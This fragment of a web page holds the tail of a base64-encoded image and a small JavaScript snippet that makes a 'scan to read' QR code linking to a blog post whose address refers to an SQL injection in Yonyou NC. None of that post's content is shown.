qkLy85+QdIXWv6r2/dZA+8EA9cVWrDqk1DyM3py/CPNfzMOas77nSr3dIncIbre0zBDLFPjWIDsHud+5rU++48iH99SHcenW5qP4MYexlLYw6jNyeMOoQrm8/OcTvevfle7zeIfvTeIPrw0Ag04VgnzJEh2B/DeYhPgR7Dkbduo4w5iAcgr3vnttLDeY1MNetO0NIPQTNw2sckgOuPw+5vdnP4XdZfX+Q6fm0dYT41kH4WU6/18lXaN0zhOwBgvaypnN1UV9Uh7Ff982J+iuc5Q5/y1oVX/r3nMD2uyxv59Q6Qp4OCPY8RLdOX1zp3Yf0gaC+CNFhjWa9p6gOqT3j1sGYt05fDmNOf4WQ/N6/3iGe5pvgYSCQqUHQfe6nWNcw+uYgOgTP9O5X7/3qvnyfWV2b/SxCXoP9P9oHUt/rYK5X7jCQEq/1cyew/F3W6qmA+XTNd+wvTf9Mh/E+vQ7iwzn2e8khtfKOv379uv9PCNTdg6gOYx94zq0XIXng+h5ye7Of7XdZTktc7VNfhMd0ga0MGP4zsc1oF5AcBLXtL++oP0OzepDeEOy+HOJbp94RkoOgvnUd9SF5CKrv8foM2Z/GG1xvnyGQqcFr2PfuUwGpP/NhzPV6iK/e+8khOUBpQ+D+Ll31gNd8SM7G9hPVRRjz6qJ1cMxd7xBP6U1wG4hTO8O+b/NwnHbPFjcvllYLxvruV2a2zBXO/NIgvSszW5XZL5jnIfo+O7v2HjPvTNsGcha8/O85gcNAIE8BjPjqdl59OiD9zYveB+LLO0J8OKJZe4owZs2J5kRIvvsw6voQHUbUfwUPA3ml6Mr8uxP464FAnobVUwXxVy8B4kPQnP3kYtflhT0DY099EUYfRm5OhPh1r1rqdb1fXe98xUv/64FUk2t93Ql82UDg+dPTt7x/oupav65rQfqpd6xMra7vefm11Oq6llyE3Ku8WvCcW7fC6lEL0meVU6+s68sGYvML/+4EDgNxUh1XtzG38mF8SiAcRlz1geRW/fe6PSA1MOI+++y69+lZGPvCyHu+c0i+68UPAynxWj93AttAIFOD57jaqk+VfueQvuqieRHGnHpHSG6vw6h5D9HsGTfXEcb++vYT1TvCWA/h8MBtIL344j9zAtdAfubcl3f9HwAA///5sdJ+AAAABklEQVQDAJSivLDdrcarAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-agent-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 